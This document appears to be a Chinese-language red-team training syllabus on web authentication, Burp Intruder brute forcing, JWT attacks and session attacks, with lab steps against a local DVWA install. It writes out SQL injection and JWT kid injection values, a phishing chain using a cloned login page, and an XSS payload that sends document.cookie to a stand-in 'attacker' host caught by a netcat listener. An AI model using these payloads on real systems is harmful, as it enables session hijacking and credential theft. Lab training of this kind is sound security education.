★ 认证与授权基础
  - 认证(Authentication) vs 授权(Authorization) vs 会话(Session)
  - 常见认证机制：
    * HTTP Basic Authentication（Base64编码的用户密码）
    * HTTP Digest Authentication（MD5哈希防重放）
    * Form-Based Authentication（表单认证，最常见）
    * Token-Based Authentication（JWT, OAuth2, SAML）
    * Multi-Factor Authentication (MFA)
    * Certificate-Based Authentication (证书认证)
  - 密码存储：明文 vs 哈希(MD5/SHA) vs 加盐哈希(bcrypt/argon2)
  - 会话管理：Cookie(Set-Cookie)、Session ID、LocalStorage、JWT
  - 常见漏洞：弱密码策略、无速率限制、明文传输、不安全的重置功能

★ Burp Intruder暴力破解
  - Intruder攻击类型：
    * Sniper（狙击手）：单个payload位置逐个替换
    * Battering Ram（冲撞车）：多个payload位置使用相同值
    * Pitchfork（叉子）：多个payload位置使用对应位置的多个词表
    * Cluster Bomb（集束炸弹）：多个payload位置的所有组合
  - Payload类型：
    * Simple List：简单词表（用户名列表、密码列表）
    * Numbers：数字序列（ID遍历）
    * Dates：日期范围
    * Brute Forcer：字符集暴力生成
    * Custom Iterator：自定义迭代器
  - Grep-Match：从响应中提取特定模式（登录成功/失败的标志）
  - Grep-Extract：提取响应中的特定数据
  - 爆破优化：线程控制、延迟设置、失败重试

★ JWT (JSON Web Token) 攻击
  - JWT结构：Header.Payload.Signature (三段Base64编码)
  - Header参数：alg(算法)、typ(类型)、kid(密钥ID)、jku(JWK Set URL)
  - 常见JWT攻击：
    * None Algorithm：修改alg为none，删除签名部分
    * Weak HMAC Key：弱密钥暴力破解（jwt-cracker, john, hashcat）
    * kid注入：kid参数注入实现目录穿越/SQL注入/命令注入
    * jku/jwk注入：篡改jku URL指向攻击者控制的JWK Set
    * alg混淆：将RS256改为HS256，使用公钥作为HMAC密钥签名
    * 过期时间操纵：修改exp声明延长Token有效期
    * 权限提升：修改role/userId等自定义声明

★ Session攻击
  - Session固定(Session Fixation)：攻击者固定受害者Session ID
  - Session劫持(Session Hijacking)：通过XSS/中间人/网络嗅探获取Session ID
  - Session预测(Session Prediction)：分析Session ID生成规律预测有效Session
  - Cookie属性安全：
    * Secure：仅通过HTTPS传输
    * HttpOnly：禁止JavaScript访问（防XSS窃取）
    * SameSite：Strict/Lax/None控制跨站发送
  - Session管理最佳实践：登录后重新生成、超时失效、安全标志

📚 第1小时 | 理论学习 (08:00 - 09:00)
  学习内容：Web认证机制、会话管理原理和常见安全漏洞
  - 认证 vs 授权 vs 会话：
    * 认证(Authentication)：你是谁？（验证身份）
    * 授权(Authorization)：你能做什么？（检查权限）
    * 会话(Session)：保持认证状态（避免重复登录）
  - HTTP是无状态协议，认证状态通过以下方式维护：
    * Cookie: Set-Cookie: PHPSESSID=xxx; HttpOnly; Secure
    * Session ID: 服务器端存储的会话标识符
    * Token: Bearer Token (JWT, OAuth2 Access Token)
    * Local Storage / Session Storage (SPA应用)
  - 常见认证漏洞：
    * 弱密码策略（无复杂度要求、无长度限制）
    * 无暴力破解保护（无速率限制、无账户锁定）
    * 明文密码传输（无HTTPS）
    * 不安全密码存储（明文或弱哈希MD5/SHA1）
    * 密码重置功能缺陷（不安全的安全问题、Token可预测）
    * 注册功能缺陷（用户名枚举、重复注册）
    * "Remember Me"功能缺陷（可预测Token、持久Cookie）
  - 常见会话漏洞：
    * Session固定：攻击者设置受害者Session ID
    * Session劫持：获取其他用户的Session ID
    * Session未失效：登出后Session仍有效
    * 会话超时过长：长时间无活动也不失效
    * 并发会话无限制：同一用户允许多设备登录
  - 认证绕过技术：
    * SQL注入绕过登录：' OR 1=1 --
    * 参数污染：username=admin&username=attacker
    * 类型混淆：{"username":"admin", "password":true}
    * 逻辑缺陷：修改响应中的状态码/布尔值
  参考文件：/home/a/成长为一个红队/网安基础知识/09-认证与授权基础.txt

周四：JWT攻击
================================================================================

📚 第1小时 | 理论学习 (08:00 - 09:00)
  学习内容：JWT (JSON Web Token) 结构分析、安全漏洞和攻击技术
  - JWT定义：紧凑的、URL安全的、用于在各方之间传输声明的开放标准(RFC 7519)
  - JWT三段式结构：Header.Payload.Signature
    * Header: {"alg":"HS256","typ":"JWT"} -> Base64Url编码
    * Payload: {"sub":"123","name":"admin","iat":1516239022,"exp":...} -> Base64Url编码
    * Signature: HMACSHA256(base64UrlEncode(header)+"."+base64UrlEncode(payload), secret)
  - 常见签名算法：
    * HS256 (HMAC with SHA-256)：对称密钥，签发和验证使用同一密钥
    * RS256 (RSA with SHA-256)：非对称密钥，私钥签发公钥验证
    * ES256 (ECDSA with SHA-256)：椭圆曲线
    * None：无签名（仅用于测试，但实现不当会被利用）
  - JWT攻击技术详解：
    1. None Algorithm攻击：
       - 修改alg为"none"
       - 删除Signature部分（保留最后的点）
       - 如服务端接受none算法 -> 任意篡改Payload
    2. HMAC密钥爆破：
       - 使用jwt-cracker或hashcat爆破HS256/HS384/HS512弱密钥
       - 目标：找到密钥后伪造任意JWT
    3. kid注入：
       - kid(Key ID)参数用于指定验证签名的密钥
       - 目录穿越：kid=../../../../dev/null -> 使用空文件签名
       - SQL注入：kid=xxx' UNION SELECT 'secret_key'-- ->
       - 命令注入：kid=xxx|whoami ->
    4. jku注入：
       - jku(JWK Set URL)指定JWK Set的来源URL
       - 如果服务端验证jku -> 指向攻击者控制的JWK Set
       - 攻击者用自己私钥签名JWT，公钥放在恶意JWK Set中
    5. 算法混淆攻击(Algorithm Confusion)：
       - 将alg从RS256改为HS256
       - 使用RS256公钥作为HS256的HMAC密钥
       - 用公钥以HS256重新签名JWT（公钥通常可获取）
  参考文件：/home/a/成长为一个红队/archstrike-web教学/07-认证与会话攻击.txt

📚 第1小时 | 理论学习 (08:00 - 09:00)
  学习内容：Session管理深度安全分析和综合攻击链
  - Session攻击分类汇总：
    1. Session固定(Session Fixation)：
       攻击者设定受害者Session ID -> 受害者登录 -> 攻击者使用该Session
    2. Session劫持(Session Hijacking)：
       通过网络嗅探/XSS/Cookie泄露获取他人Session ID
    3. Session预测(Session Prediction)：
       分析Session ID生成算法预测合法Session
    4. 跨站请求伪造(CSRF)利用Session自动携带
    5. Session投毒(Session Poisoning)：
       在Session中注入恶意数据影响应用逻辑
  - Cookie属性安全深度：
    * Secure：仅通过HTTPS传输（防中间人嗅探）
    * HttpOnly：禁止JavaScript访问document.cookie（防XSS窃取）
    * SameSite=Strict：完全禁止跨站发送Cookie
    * SameSite=Lax：允许顶级导航发送Cookie（GET请求）
    * SameSite=None：允许所有跨站请求（需同时设置Secure）
    * Domain：指定Cookie的有效域名范围
    * Path：指定Cookie的有效路径范围
    * Expires/Max-Age：Cookie有效期
  - 常见Session管理缺陷：
    * 登录前后Session ID不变（Session固定攻击可钻）
    * 登出不清除服务端Session
    * Session ID通过URL传递（URL重写）
    * Session存储在不安全位置（LocalStorage vs Cookie）
    * 缺少并发Session限制
  - 本周攻击链串联：
    SET钓鱼获取凭据 -> 登录后观察Session机制 -> Burp爆破测试 ->
    Session固定攻击 -> JWT篡改提权 -> 凭证嗅探

  练习内容：Session攻击综合练习
  操作步骤：
    Step 1: Session固定攻击练习:
      - DVWA安全级别设为Low
      - 获取一个未认证的PHPSESSID: 直接访问DVWA获取Cookie
      - 构造URL: http://localhost/dvwa/login.php?PHPSESSID=attacker_session_id
      - 如果应用接受URL中的PHPSESSID -> Session固定成功
      - 当受害者使用此URL登录后，攻击者可用同一PHPSESSID访问受害者会话
    Step 2: 使用Burp Suite分析Session特征:
      - 多次登录/登出，观察PHPSESSID的变化
      - 分析Session ID的生成模式（随机/递增/可预测）
      - 对比登录前后的PHPSESSID是否变化
      - 观察登出后Session是否失效
    Step 3: 测试Cookie属性:
      - 使用Burp查看Set-Cookie头
      - 检查是否设置Secure/HttpOnly/SameSite属性
      - 检查Cookie过期时间设置
    Step 4: Session劫持模拟:
      - 在XSS存储页面注入: <script>new Image().src='http://attacker/?c='+document.cookie</script>
      - 启动netcat监听: nc -lvp 80
      - 另一个浏览器访问被注入的XSS页面
      - 观察netcat是否接收到Cookie
    Step 5: 综合认证攻击链:
      - SET克隆DVWA登录页面
      - 钓鱼获取管理员Cookie/Session
      - 使用窃取的Session直接访问管理页面
      - 如果为JWT: 篡改Payload提升权限
    Step 6: 对比分析不同认证机制的优缺点:
      - Session Cookie vs JWT vs OAuth2
      - 各自的攻击面和防护措施
